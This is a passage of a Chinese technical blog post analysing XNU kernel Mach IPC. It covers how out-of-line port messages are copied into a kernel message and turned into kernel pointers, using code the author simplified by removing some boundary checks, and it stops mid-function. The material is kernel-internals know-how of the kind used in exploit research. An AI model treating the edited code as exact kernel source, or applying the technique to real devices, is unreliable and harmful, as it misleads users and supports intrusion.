<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_get(</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	msg_addr, <span class="comment">// user space mach_msg_addr</span></span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	<span class="built_in">size</span>, <span class="comment">// send size = mach_msg_hdr-&gt;msgh_size = sizeof(mach_msg)</span></span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span>		*kmsgp) <span class="comment">// kmsg to return</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>		msg_and_trailer_size;</span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span> 			kmsg;</span><br><span class="line">    <span class="keyword">mach_msg_max_trailer_t</span>	*trailer;</span><br><span class="line">    <span class="keyword">mach_msg_legacy_base_t</span>      legacy_base;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>             len_copied;</span><br><span class="line">    legacy_base.body.msgh_descriptor_count = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. copy mach header &amp; body to kernel legacy_base</span></span><br><span class="line">    len_copied = <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_legacy_base_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (copyinmsg(msg_addr, (<span class="keyword">char</span> *)&amp;legacy_base, len_copied))</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_INVALID_DATA;</span><br><span class="line">    </span><br><span class="line">    msg_addr += <span class="keyword">sizeof</span>(legacy_base.header);</span><br><span class="line">    <span class="comment">// arm64 fixup</span></span><br><span class="line">    <span class="built_in">size</span> += LEGACY_HEADER_SIZE_DELTA;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. create a kmsg</span></span><br><span class="line">    msg_and_trailer_size = <span class="built_in">size</span> + MAX_TRAILER_SIZE;</span><br><span class="line">    kmsg = ipc_kmsg_alloc(msg_and_trailer_size);</span><br><span class="line">    <span class="keyword">if</span> (kmsg == IKM_NULL)</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_NO_BUFFER;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.1 init kernel mach_header</span></span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_size	= <span class="built_in">size</span>;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_bits = legacy_base.header.msgh_bits;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_remote_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_remote_port);</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_local_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_local_port);</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_voucher_port = legacy_base.header.msgh_voucher_port;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_id = legacy_base.header.msgh_id;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. copy userspace mach body to kernel</span></span><br><span class="line">    <span class="keyword">if</span> (copyinmsg(msg_addr, (<span class="keyword">char</span> *)(kmsg-&gt;ikm_header + <span class="number">1</span>), <span class="built_in">size</span> - (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">mach_msg_header_t</span>))) &#123;</span><br><span class="line">    	ipc_kmsg_free(kmsg);</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_INVALID_DATA;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. init kmsg trailer</span></span><br><span class="line">    trailer = (<span class="keyword">mach_msg_max_trailer_t</span> *) ((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="built_in">size</span>);</span><br><span class="line">    trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;</span><br><span class="line">    trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;</span><br><span class="line">    trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;</span><br><span class="line">    trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span><br><span class="line">    trailer-&gt;msgh_labels.sender = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    *kmsgp = kmsg;</span><br><span class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个 kmsg 的构造过程较为复杂，主要包含了 4 步：</p>
<ol>
<li>在内核中新建一个 <code>mach_msg_legacy_base_t</code> 对象，它实际上是一个 mach_message 的基本结构，随后将用户空间的 mach header 和 body 通过 <code>copyinmsg</code> 复制到 <code>mach_msg_legacy_base_t</code> 对象，主要目的是在方便在内核中获取消息的 mach 数据结构；<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">mach_msg_legacy_header_t</span>    header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span>             body;</span><br><span class="line">&#125; <span class="keyword">mach_msg_legacy_base_t</span>;</span><br></pre></td></tr></table></figure></li>
<li>创建一个 kmsg 数据结构，kmsg 包含了 mach 消息的全部数据，并包含了额外的 buffer 来兼容 64 位系统向 32 位系统发送消息的情况；</li>
<li>将用户空间的 mach 消息体拷贝到 kmsg；</li>
<li>初始化 kmsg 的 trailler，trailler 是一个位于 kmsg 尾部的变长数据结构，用于携带一些额外信息。</li>
</ol>
<p>这部分最复杂的部分是第 2 步 kmsg 的创建，其复杂性在于对整个 kmsg 空间的构造，涉及大量的地址与尺寸计算，由于整个过程十分冗长无聊，这里直接给出结论，有兴趣的读者可以顺着方法自己构造一遍整个 kmsg 数据体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> *  |-kmsg(84)-|---body(60)---|-mach_msg_hdr(24)-|-mach_msg_body(4)-|-descriptor(16)-|-trailer(0x44)-|</span></span><br><span class="line"><span class="comment"> *      |                       ^</span></span><br><span class="line"><span class="comment"> *      |                       |</span></span><br><span class="line"><span class="comment"> *   ikm_header ----------------|</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>可见用户空间发送的 mach message 结构被放置在了 kmsg body 后面，包含 header, body 和 descriptor 三部分，随后跟着一个 trailer。</p>
<p>事实上，body 区域是被预留的，用于处理 kmsg 无法完整容纳下 descriptor 的情况，这一点在 <code>ipc_kmsg_alloc</code> 开头的注释中可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * LP64support -</span></span><br><span class="line"><span class="comment"> * Pad the allocation in case we need to expand the</span></span><br><span class="line"><span class="comment"> * message descrptors for user spaces with pointers larger than</span></span><br><span class="line"><span class="comment"> * the kernel's own, or vice versa.  We don't know how many descriptors</span></span><br><span class="line"><span class="comment"> * there are yet, so just assume the whole body could be</span></span><br><span class="line"><span class="comment"> * descriptors (if there could be any at all).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The expansion space is left in front of the header,</span></span><br><span class="line"><span class="comment"> * because it is easier to pull the header and descriptors</span></span><br><span class="line"><span class="comment"> * forward as we process them than it is to push all the</span></span><br><span class="line"><span class="comment"> * data backwards.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>即当用户空间的 descriptor 比内核空间大时，我们可以将 kmsg 从 <code>mach_msg_header</code> 开始整体左移，为 descriptor 空出空间。之所以在左侧预留空间是因为 kmsg 后面的内存空间可能已被占用，将 header 向前拉要比向后推动要更简单。</p>
<h2 id="将用户空间的-mach-message-剩余部分复制到-kmsg"><a href="#将用户空间的-mach-message-剩余部分复制到-kmsg" class="headerlink" title="将用户空间的 mach message 剩余部分复制到 kmsg"></a>将用户空间的 mach message 剩余部分复制到 kmsg</h2><p>构造好了 kmsg 以后，我们只完成了 header 和 body 的复制，其中 body 包含了 descriptor 的信息，接下来的工作是通过 <code>ipc_kmsg_copyin</code> 函数赋值余下的部分，并为 OOL Message 中的 OOL Memory 转化为 in-line memory。</p>
<p>我们先来看 <code>ipc_kmsg_copyin</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_copyin(</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span>		kmsg,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_msg_priority_t</span>     <span class="keyword">override</span>,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span>	*optionp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_msg_return_t</span> mr;</span><br><span class="line">    </span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_bits &amp;= MACH_MSGH_BITS_USER;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. copy header rights</span></span><br><span class="line">    mr = ipc_kmsg_copyin_header(kmsg, space, <span class="keyword">override</span>, optionp);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS)</span><br><span class="line">    <span class="keyword">return</span> mr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((kmsg-&gt;ikm_header-&gt;msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. copy body</span></span><br><span class="line">    mr = ipc_kmsg_copyin_body(kmsg, space, <span class="built_in">map</span>, optionp);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要包含两个步骤：</p>
<ol>
<li>复制用户空间的 mach message rights 到 kmsg，这里的 rights 指的是 port 的发送和接收能力；</li>
<li>复制 descriptor 到 kmsg，并根据 descriptor 对 OOL Memory 创建相应的内核空间完成地址空间的转换。</li>
</ol>
<p>这里重点讲一下步骤 2，它是能迫使内核完成从 port 句柄到 port address 转换和指针分配的关键，下面是笔者<strong>在 arm64 和 上述 OOL Message 方式调用条件下去掉一些边界判断后精简的</strong> <code>ipc_kmsg_copyin_body</code> 内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_copyin_body(</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span>	kmsg,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>	space,</span><br><span class="line">	<span class="keyword">vm_map_t</span>    <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span> *optionp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ipc_object_t</span> dest;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span>	*body;</span><br><span class="line">    <span class="keyword">mach_msg_descriptor_t</span> *user_addr, *kern_addr;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> dsc_count;</span><br><span class="line">    <span class="keyword">boolean_t</span> is_task_64bit = (<span class="built_in">map</span>-&gt;max_offset &gt; VM_MAX_ADDRESS);</span><br><span class="line">    <span class="keyword">boolean_t</span> <span class="built_in">complex</span> = FALSE;</span><br><span class="line">    <span class="keyword">vm_size_t</span> space_needed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">vm_offset_t</span>	paddr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">vm_map_copy_t</span> copy = VM_MAP_COPY_NULL;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> i;</span><br><span class="line">    <span class="keyword">mach_msg_return_t</span> mr = MACH_MSG_SUCCESS;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. init descriptor size</span></span><br><span class="line">    <span class="keyword">vm_size_t</span> descriptor_size = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="keyword">ipc_object_t</span>) kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">    body = (<span class="keyword">mach_msg_body_t</span> *) (kmsg-&gt;ikm_header + <span class="number">1</span>);</span><br><span class="line">    dsc_count = body-&gt;msgh_descriptor_count;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Make an initial pass to determine kernal VM space requirements for</span></span><br><span class="line"><span class="comment">     * physical copies and possible contraction of the descriptors from</span></span><br><span class="line"><span class="comment">     * processes with pointers larger than the kernel's.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    daddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dsc_count; i++) &#123;</span><br><span class="line">        <span class="comment">/* make sure the descriptor fits in the message */</span></span><br><span class="line">        descriptor_size += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Allocate space in the pageable kernel ipc copy map for all the</span></span><br><span class="line"><span class="comment">     * ool data that is to be physically copied.  Map is marked wait for</span></span><br><span class="line"><span class="comment">     * space.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (space_needed) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vm_allocate_kernel(ipc_kernel_copy_map, &amp;paddr, space_needed,</span><br><span class="line">                    VM_FLAGS_ANYWHERE, VM_KERN_MEMORY_IPC) != KERN_SUCCESS) &#123;</span><br><span class="line">            mr = MACH_MSG_VM_KERNEL;</span><br><span class="line">            <span class="keyword">goto</span> clean_message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* user_addr = just after base as it was copied in */</span></span><br><span class="line">    user_addr = (<span class="keyword">mach_msg_descriptor_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. pull header forward if needed</span></span><br><span class="line">    <span class="comment">/* Shift the mach_msg_base_t down to make room for dsc_count*16bytes of descriptors */</span></span><br><span class="line">    <span class="keyword">if</span> (descriptor_size != <span class="number">16</span> * dsc_count) &#123;</span><br><span class="line">        <span class="keyword">vm_offset_t</span> dsc_adjust = <span class="number">16</span> * dsc_count - descriptor_size;</span><br><span class="line">        memmove((<span class="keyword">char</span> *)(((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header) - dsc_adjust), kmsg-&gt;ikm_header, <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">        kmsg-&gt;ikm_header = (<span class="keyword">mach_msg_header_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header - dsc_adjust);</span><br><span class="line">        <span class="comment">/* Update the message size for the larger in-kernel representation */</span></span><br><span class="line">        kmsg-&gt;ikm_header-&gt;msgh_size += (<span class="keyword">mach_msg_size_t</span>)dsc_adjust;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* kern_addr = just after base after it has been (conditionally) moved */</span></span><br><span class="line">    kern_addr = (<span class="keyword">mach_msg_descriptor_t</span> *)((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_base_t</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. copy ool ports to kernel zone</span></span><br><span class="line">    <span class="comment">/* handle the OOL regions and port descriptors. */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dsc_count; i++) &#123;</span><br><span class="line">        user_addr = ipc_kmsg_copyin_ool_ports_descriptor((<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *)kern_addr, </span><br><span class="line">    			            user_addr, is_task_64bit, <span class="built_in">map</span>, space, dest, kmsg, optionp, &amp;mr);</span><br><span class="line">        kern_addr++;</span><br><span class="line">        <span class="built_in">complex</span> = TRUE;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">complex</span>) &#123;</span><br><span class="line">        kmsg-&gt;ikm_header-&gt;msgh_bits &amp;= ~MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mr;</span><br></pre></td></tr></table></figure>
<p>这个函数较为复杂，笔者在其中用注释标出了 3 个关键步骤：</p>
<ol>
<li>初始化 descriptor size，它是 <code>mach_msg_ool_ports_descriptor_t</code> 的用户空间大小；</li>
<li>如果发现 kmsg 容纳不了用户空间的 <code>mach_msg_ool_ports_descriptor_t</code>，将 kmsg 从 header 开始整体往前移动，为 descriptor 留下足够的空间，这与上文中提到的 kmsg body expand size 描述一致；</li>
<li>将 ool ports 拷贝到内核地址空间，这其中包含了从 port 句柄到 ipc_port address 的转换。</li>
</ol>
<p>由于我们的 body 只包含了一个 descriptor，且用户空间尺寸与内核空间中一致，因此不需要 pull header forward，接下来我们终于来到了本文的重头戏：ool ports 转换。</p>
<p>port 句柄到地址的转换是通过调用 <code>ipc_kmsg_copyin_ool_ports_descriptor</code> 函数完成的，下面我们看一下该函数的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_descriptor_t</span> *</span><br><span class="line">ipc_kmsg_copyin_ool_ports_descriptor(</span><br><span class="line">	<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *dsc,</span><br><span class="line">	<span class="keyword">mach_msg_descriptor_t</span> *user_dsc,</span><br><span class="line">	<span class="keyword">int</span> is_64bit,</span><br><span class="line">	<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">ipc_space_t</span> space,</span><br><span class="line">	<span class="keyword">ipc_object_t</span> dest,</span><br><span class="line">	<span class="keyword">ipc_kmsg_t</span> kmsg,</span><br><span class="line">	<span class="keyword">mach_msg_option_t</span> *optionp,</span><br><span class="line">	<span class="keyword">mach_msg_return_t</span> *mr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">ipc_object_t</span> *objects;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">mach_vm_offset_t</span> addr;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> user_disp;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> result_disp;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> count;</span><br><span class="line">    <span class="keyword">mach_msg_copy_options_t</span> copy_option;</span><br><span class="line">    <span class="keyword">boolean_t</span> deallocate;</span><br><span class="line">    <span class="keyword">mach_msg_descriptor_type_t</span> type;</span><br><span class="line">    <span class="keyword">vm_size_t</span> ports_length, names_length;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_msg_ool_ports_descriptor64_t</span> *user_ool_dsc = (typeof(user_ool_dsc))user_dsc;</span><br><span class="line">    addr = (<span class="keyword">mach_vm_offset_t</span>)user_ool_dsc-&gt;address;</span><br><span class="line">    count = user_ool_dsc-&gt;count;</span><br><span class="line">    deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">    copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">    user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">    type = user_ool_dsc-&gt;type;</span><br><span class="line">    </span><br><span class="line">    user_dsc = (typeof(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    dsc-&gt;deallocate = deallocate;</span><br><span class="line">    dsc-&gt;copy = copy_option;</span><br><span class="line">    dsc-&gt;type = type;</span><br><span class="line">    dsc-&gt;count = count;</span><br><span class="line">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span><br><span class="line">    </span><br><span class="line">    result_disp = ipc_object_copyin_type(user_disp);</span><br><span class="line">    dsc-&gt;disposition = result_disp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. calculate port_pointers length and port_names length</span></span><br><span class="line">    <span class="comment">/* calculate length of data in bytes, rounding up */</span></span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_t</span>), &amp;ports_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (os_mul_overflow(count, <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>), &amp;names_length)) &#123;</span><br><span class="line">        *mr = MACH_SEND_TOO_LARGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. alloc kenrel zone for port pointers</span></span><br><span class="line">    data = kalloc(ports_length);</span><br><span class="line">    <span class="keyword">mach_port_name_t</span> *names = &amp;((<span class="keyword">mach_port_name_t</span> *)data)[count];</span><br><span class="line">    <span class="keyword">if</span> (copyinmap(<span class="built_in">map</span>, addr, names, names_length) != KERN_SUCCESS) &#123;</span><br><span class="line">        kfree(data, ports_length);</span><br><span class="line">        *mr = MACH_SEND_INVALID_MEMORY;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (deallocate) &#123;</span><br><span class="line">        (<span class="keyword">void</span>) mach_vm_deallocate(<span class="built_in">map</span>, addr, (<span class="keyword">mach_vm_size_t</span>)ports_length);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    objects = (<span class="keyword">ipc_object_t</span> *) data;</span><br><span class="line">    <span class="comment">// 3. 替换 ool address 为 kernel address</span></span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">mach_port_name_t</span> name = names[i];</span><br><span class="line">        <span class="keyword">ipc_object_t</span> object;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (<span class="keyword">ipc_object_t</span>)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. convert port_name to port_addr</span></span><br><span class="line">        <span class="keyword">kern_return_t</span> kr = 